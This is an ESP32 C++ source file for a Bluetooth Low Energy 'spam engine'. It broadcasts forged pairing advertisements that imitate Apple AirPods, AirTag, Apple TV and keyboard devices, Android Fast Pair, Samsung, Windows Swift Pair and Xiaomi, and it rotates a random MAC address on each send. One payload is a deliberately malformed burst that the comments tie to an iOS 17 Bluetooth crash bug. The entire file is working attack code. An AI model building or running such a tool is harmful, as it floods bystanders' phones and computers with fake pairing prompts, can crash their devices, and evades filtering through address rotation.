#include "ble_spam_engine.h"
#include <esp_bt.h>
#include <esp_bt_main.h>
#include <esp_gap_ble_api.h>
#include <esp_bt_device.h>
#include <esp_random.h>

// ── Singleton ──────────────────────────────────────────────────
BleSpamEngine& BleSpamEngine::instance() {
    static BleSpamEngine inst;
    return inst;
}

// ── GAP callback: drives the set-addr -> set-data -> advertise sequence.
// Each BLE config call is async; we must wait for its *_COMPLETE_EVT before
// issuing the next one, otherwise data/address silently fail to apply and
// nothing actually goes out over the air (this was the original bug).
static void gap_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t* param) {
    switch (event) {
        case ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT:
            Serial.printf("[GAP] SET_STATIC_RAND_ADDR_EVT status=%d\n", param->set_rand_addr_cmpl.status);
            BleSpamEngine::instance().onAddrSet();
            break;
        case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
            Serial.printf("[GAP] ADV_DATA_RAW_SET_COMPLETE_EVT status=%d\n", param->adv_data_raw_cmpl.status);
            BleSpamEngine::instance().onAdvDataSet();
            break;
        case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
            Serial.printf("[GAP] ADV_START_COMPLETE_EVT status=%d\n", param->adv_start_cmpl.status);
            BleSpamEngine::instance().onAdvStarted();
            break;
        case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
            Serial.printf("[GAP] ADV_STOP_COMPLETE_EVT status=%d\n", param->adv_stop_cmpl.status);
            BleSpamEngine::instance().onAdvStopped();
            break;
        default:
            Serial.printf("[GAP] other event=%d\n", (int)event);
            break;
    }
}

void BleSpamEngine::begin() {
    // Initialize the BT controller in BLE-only mode (saves RAM, faster boot)
    if (!btStarted()) {
        esp_bt_controller_config_t cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
        esp_err_t err = esp_bt_controller_init(&cfg);
        Serial.printf("[BLE] controller_init: %d\n", err);
    }
    esp_err_t err1 = esp_bt_controller_enable(ESP_BT_MODE_BLE);
    Serial.printf("[BLE] controller_enable: %d\n", err1);

    esp_err_t err2 = esp_bluedroid_init();
    Serial.printf("[BLE] bluedroid_init: %d\n", err2);

    esp_err_t err3 = esp_bluedroid_enable();
    Serial.printf("[BLE] bluedroid_enable: %d\n", err3);

    esp_err_t err4 = esp_ble_gap_register_callback(gap_cb);
    Serial.printf("[BLE] gap_register_callback: %d\n", err4);

    // NOTE: do NOT call randomizeMac() here. step is still IDLE at this point
    // (start() hasn't run yet), so the resulting SET_STATIC_RAND_ADDR_EVT would
    // race with/“steal” the completion event meant for the first real
    // beginAdvertiseSequence() call, leaving the state machine stuck forever
    // with TX=0. The very first randomize now happens inside start()/loop().
}

// ── Dispatch: build the payload, then kick off the async sequence ──
void BleSpamEngine::beginAdvertiseSequence(SpamType type) {
    std::vector<uint8_t> payload;
    switch (type) {
        case SpamType::APPLE_AIRPODS:
        case SpamType::APPLE_AIRPODS_PRO:
        case SpamType::APPLE_AIRPODS_MAX:
        case SpamType::APPLE_AIRTAG:
        case SpamType::APPLE_TV_SETUP:
        case SpamType::APPLE_KEYBOARD:
        case SpamType::APPLE_ACTION_MODAL:
        case SpamType::APPLE_CRASH_IOS17:
            payload = buildAppleContinuity(type);
            break;
        case SpamType::ANDROID_FASTPAIR:
            payload = buildFastPair();
            break;
        case SpamType::SAMSUNG_BUDS:
            payload = buildSamsungEasySetup(false);
            break;
        case SpamType::SAMSUNG_WATCH:
            payload = buildSamsungEasySetup(true);
            break;
        case SpamType::WINDOWS_SWIFTPAIR:
            payload = buildSwiftPair();
            break;
        case SpamType::XIAOMI_QUICKCONNECT:
            payload = buildXiaomi();
            break;
        default:
            return;
    }

    if (payload.size() > 31) payload.resize(31); // legacy ADV_IND payload cap

    pendingPayload = payload;
    pendingType = type;

    Serial.printf("[BLE] beginAdvertiseSequence type=%d payloadLen=%u rotateMac=%d\n",
                   (int)type, (unsigned)payload.size(), rotateMac);

    if (rotateMac) {
        step = Step::SETTING_ADDR;
        randomizeMac(); // async: completion arrives in onAddrSet()
    } else {
        step = Step::SETTING_DATA;
        esp_err_t err = esp_ble_gap_config_adv_data_raw(pendingPayload.data(), pendingPayload.size());
        Serial.printf("[BLE] config_adv_data_raw (no rotate) -> %d\n", err);
    }
}

// onAddrSet/onAdvDataSet/onAdvStarted/onAdvStopped are invoked from the GAP
// callback (BLE task context) — keep them fast and non-blocking.

void BleSpamEngine::onAddrSet() {
    Serial.printf("[BLE] onAddrSet step=%d\n", (int)step);
    if (step != Step::SETTING_ADDR) return;
    step = Step::SETTING_DATA;
    esp_err_t err = esp_ble_gap_config_adv_data_raw(pendingPayload.data(), pendingPayload.size());
    Serial.printf("[BLE] config_adv_data_raw -> %d\n", err);
}

void BleSpamEngine::onAdvDataSet() {
    Serial.printf("[BLE] onAdvDataSet step=%d\n", (int)step);
    if (step != Step::SETTING_DATA) return;
    step = Step::ADVERTISING;

    esp_ble_adv_params_t advParams = {};
    advParams.adv_int_min = 0x20;
    advParams.adv_int_max = 0x20;
    advParams.adv_type = ADV_TYPE_NONCONN_IND;
    advParams.own_addr_type = rotateMac ? BLE_ADDR_TYPE_RANDOM : BLE_ADDR_TYPE_PUBLIC;
    advParams.channel_map = ADV_CHNL_ALL;
    advParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;

    esp_err_t err = esp_ble_gap_start_advertising(&advParams);
    Serial.printf("[BLE] start_advertising -> %d\n", err);
}

void BleSpamEngine::onAdvStarted() {
    Serial.printf("[BLE] onAdvStarted step=%d\n", (int)step);
    if (step != Step::ADVERTISING) return;

    advStartedAtMs = millis();

    stats.txCount++;
    stats.lastTxTime = millis();
    stats.activeType = pendingType;

    Serial.printf("[BLE] TX #%lu mac=%02X:%02X:%02X:%02X:%02X:%02X\n",
                   (unsigned long)stats.txCount,
                   stats.lastMac[0], stats.lastMac[1], stats.lastMac[2],
                   stats.lastMac[3], stats.lastMac[4], stats.lastMac[5]);

    if (txCallback) {
        txCallback(pendingType, stats.lastMac, pendingPayload.data(), pendingPayload.size());
    }
}

void BleSpamEngine::onAdvStopped() {
    Serial.printf("[BLE] onAdvStopped, was step=%d\n", (int)step);
    step = Step::IDLE;
}

// ── MAC rotation: re-randomizes the BLE static address (async) ──
void BleSpamEngine::randomizeMac() {
    uint8_t mac[6];
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02;   // locally-administered, unicast (random static)

    esp_bd_addr_t addr;
    memcpy(addr, mac, 6);
    esp_err_t err = esp_ble_gap_set_rand_addr(addr); // completion -> onAddrSet()
    Serial.printf("[BLE] set_rand_addr(%02X:%02X:%02X:%02X:%02X:%02X) -> %d\n",
                   mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], err);

    memcpy(stats.lastMac, mac, 6);
}

// ── Public control ──────────────────────────────────────────────
void BleSpamEngine::start(SpamType type) {
    Serial.printf("[BLE] start(type=%d)\n", (int)type);
    cycleQueue.clear();
    cycleIndex = 0;

    switch (type) {
        case SpamType::ALL_APPLE:
            cycleQueue = { SpamType::APPLE_AIRPODS, SpamType::APPLE_AIRPODS_PRO,
                            SpamType::APPLE_AIRPODS_MAX, SpamType::APPLE_AIRTAG,
                            SpamType::APPLE_TV_SETUP, SpamType::APPLE_KEYBOARD,
                            SpamType::APPLE_ACTION_MODAL, SpamType::APPLE_CRASH_IOS17 };
            break;
        case SpamType::ALL_ANDROID:
            cycleQueue = { SpamType::ANDROID_FASTPAIR, SpamType::SAMSUNG_BUDS,
                            SpamType::SAMSUNG_WATCH, SpamType::XIAOMI_QUICKCONNECT };
            break;
        case SpamType::ALL_DEVICES:
            cycleQueue = { SpamType::APPLE_AIRPODS, SpamType::APPLE_AIRTAG,
                            SpamType::APPLE_TV_SETUP, SpamType::ANDROID_FASTPAIR,
                            SpamType::SAMSUNG_BUDS, SpamType::WINDOWS_SWIFTPAIR,
                            SpamType::XIAOMI_QUICKCONNECT };
            break;
        default:
            cycleQueue = { type };
            break;
    }

    currentType = type;
    stats.running = true;
    stats.txCount = 0;
    step = Step::IDLE;
    lastSendMs = 0; // force immediate send on next loop()
}

void BleSpamEngine::stop() {
    stats.running = false;
    if (step == Step::ADVERTISING) {
        step = Step::STOPPING;
        esp_ble_gap_stop_advertising(); // completion -> onAdvStopped()
    } else {
        step = Step::IDLE;
    }
    currentType = SpamType::NONE;
}

void BleSpamEngine::loop() {
    if (!stats.running || cycleQueue.empty()) return;

    // Each advertisement must be explicitly stopped before the next one can
    // start (the controller only supports one active legacy adv set here).
    if (step == Step::ADVERTISING) {
        uint32_t now = millis();
        if (now - advStartedAtMs >= intervalMs) {
            step = Step::STOPPING;
            esp_ble_gap_stop_advertising(); // -> onAdvStopped() -> step=IDLE
        }
        return;
    }

    if (step != Step::IDLE) return; // mid-sequence (waiting on a GAP callback)

    uint32_t now = millis();
    if (now - lastSendMs < 1) return; // tiny debounce so IDLE->next doesn't spin the same frame
    lastSendMs = now;

    SpamType toSend = cycleQueue[cycleIndex];
    cycleIndex = (cycleIndex + 1) % cycleQueue.size();

    beginAdvertiseSequence(toSend);
}

// ── Apple Continuity-style payloads (AirPods/AirTag/AppleTV/Keyboard/etc) ──
// These mimic Apple's proximity-pairing message types (type byte selects the popup).
std::vector<uint8_t> BleSpamEngine::buildAppleContinuity(SpamType type) {
    std::vector<uint8_t> data;

    // Flags AD
    data.insert(data.end(), {0x02, 0x01, 0x06});

    // Manufacturer Specific Data: Apple (0x004C)
    std::vector<uint8_t> mfg = {0x4C, 0x00};

    switch (type) {
        case SpamType::APPLE_AIRPODS:
        case SpamType::APPLE_AIRPODS_PRO:
        case SpamType::APPLE_AIRPODS_MAX: {
            // Proximity Pairing message (0x07) — battery/lid/color random
            mfg.push_back(0x07);
            mfg.push_back(0x19); // length

            uint8_t model = (type == SpamType::APPLE_AIRPODS_PRO) ? 0x0E :
                            (type == SpamType::APPLE_AIRPODS_MAX) ? 0x0A : 0x02;
            mfg.push_back(model);
            mfg.push_back(0x55);
            mfg.push_back(esp_random() & 0xFF); // status flags

            uint8_t leftBat  = esp_random() % 11;
            uint8_t rightBat = esp_random() % 11;
            uint8_t caseBat  = esp_random() % 11;
            mfg.push_back((rightBat << 4) | leftBat);
            mfg.push_back(0x01 | (caseBat << 4));
            mfg.push_back((esp_random() & 0x0F));

            uint8_t rnd[16];
            esp_fill_random(rnd, sizeof(rnd));
            mfg.insert(mfg.end(), rnd, rnd + sizeof(rnd));
            break;
        }
        case SpamType::APPLE_AIRTAG: {
            // "Find My" nearby-action style payload
            mfg.push_back(0x12);
            mfg.push_back(0x19);
            uint8_t rnd[27];
            esp_fill_random(rnd, sizeof(rnd));
            mfg.insert(mfg.end(), rnd, rnd + sizeof(rnd));
            break;
        }
        case SpamType::APPLE_TV_SETUP: {
            mfg.push_back(0x0C); // tvOS setup new device
            mfg.push_back(0x06);
            mfg.push_back(0x01);
            uint8_t rnd[5];
            esp_fill_random(rnd, sizeof(rnd));
            mfg.insert(mfg.end(), rnd, rnd + sizeof(rnd));
            break;
        }
        case SpamType::APPLE_KEYBOARD: {
            mfg.push_back(0x09); // keyboard pairing
            mfg.push_back(0x08);
            uint8_t rnd[8];
            esp_fill_random(rnd, sizeof(rnd));
            mfg.insert(mfg.end(), rnd, rnd + sizeof(rnd));
            break;
        }
        case SpamType::APPLE_ACTION_MODAL: {
            mfg.push_back(0x0F); // action modal (join this AppleTV / hey siri etc)
            mfg.push_back(0x05);
            mfg.push_back(esp_random() & 0xFF);
            uint8_t rnd[4];
            esp_fill_random(rnd, sizeof(rnd));
            mfg.insert(mfg.end(), rnd, rnd + sizeof(rnd));
            break;
        }
        case SpamType::APPLE_CRASH_IOS17:
        default: {
            // Dense malformed-length continuity burst used for the iOS17 BLE-crash bug
            mfg.push_back(0x07);
            mfg.push_back(0xFF); // oversized/garbage length on purpose
            uint8_t rnd[20];
            esp_fill_random(rnd, sizeof(rnd));
            mfg.insert(mfg.end(), rnd, rnd + sizeof(rnd));
            break;
        }
    }

    data.push_back(mfg.size() + 1);
    data.push_back(0xFF); // Manufacturer Specific Data AD type
    data.insert(data.end(), mfg.begin(), mfg.end());

    return data;
}

// ── Android Fast Pair ───────────────────────────────────────────
std::vector<uint8_t> BleSpamEngine::buildFastPair() {
    std::vector<uint8_t> data;
    data.insert(data.end(), {0x02, 0x01, 0x06});

    // Service Data: Fast Pair UUID 0xFE2C + random model ID
    uint8_t modelId[3];
    esp_fill_random(modelId, 3);

    std::vector<uint8_t> svc = {0x2C, 0xFE};
    svc.insert(svc.end(), modelId, modelId + 3);

    data.push_back(svc.size() + 1);
    data.push_back(0x16); // Service Data - 16-bit UUID
    data.insert(data.end(), svc.begin(), svc.end());

    return data;
}

// ── Samsung Easy Setup (Buds / Watch) ───────────────────────────
std::vector<uint8_t> BleSpamEngine::buildSamsungEasySetup(bool watch) {
    std::vector<uint8_t> data;
    data.insert(data.end(), {0x02, 0x01, 0x06});

    std::vector<uint8_t> mfg = {0x75, 0x00}; // Samsung company ID
    mfg.push_back(watch ? 0x01 : 0x02);      // device class
    mfg.push_back(0x09);
    uint8_t rnd[9];
    esp_fill_random(rnd, sizeof(rnd));
    mfg.insert(mfg.end(), rnd, rnd + sizeof(rnd));

    data.push_back(mfg.size() + 1);
    data.push_back(0xFF);
    data.insert(data.end(), mfg.begin(), mfg.end());

    return data;
}

// ── Windows Swift Pair ──────────────────────────────────────────
std::vector<uint8_t> BleSpamEngine::buildSwiftPair() {
    std::vector<uint8_t> data;
    data.insert(data.end(), {0x02, 0x01, 0x06});

    std::vector<uint8_t> mfg = {0x06, 0x00}; // Microsoft company ID
    mfg.push_back(0x03); // Microsoft Beacon ID (Swift Pair)
    mfg.push_back(0x00); // sub scenario: pairing
    mfg.push_back(0x80); // device type: input
    uint8_t rnd[3];
    esp_fill_random(rnd, sizeof(rnd));
    mfg.insert(mfg.end(), rnd, rnd + sizeof(rnd));

    data.push_back(mfg.size() + 1);
    data.push_back(0xFF);
    data.insert(data.end(), mfg.begin(), mfg.end());

    // Add a short device name so Windows shows something pairable
    const char* name = "BT Mouse";
    uint8_t nameLen = strlen(name);
    data.push_back(nameLen + 1);
    data.push_back(0x09); // Complete Local Name
    data.insert(data.end(), name, name + nameLen);

    return data;
}

// ── Xiaomi Quick Connect ────────────────────────────────────────
std::vector<uint8_t> BleSpamEngine::buildXiaomi() {
    std::vector<uint8_t> data;
    data.insert(data.end(), {0x02, 0x01, 0x06});

    std::vector<uint8_t> svc = {0x95, 0xFE}; // Xiaomi service UUID 0xFE95
    uint8_t rnd[10];
    esp_fill_random(rnd, sizeof(rnd));
    svc.insert(svc.end(), rnd, rnd + sizeof(rnd));

    data.push_back(svc.size() + 1);
    data.push_back(0x16);
    data.insert(data.end(), svc.begin(), svc.end());

    return data;
}

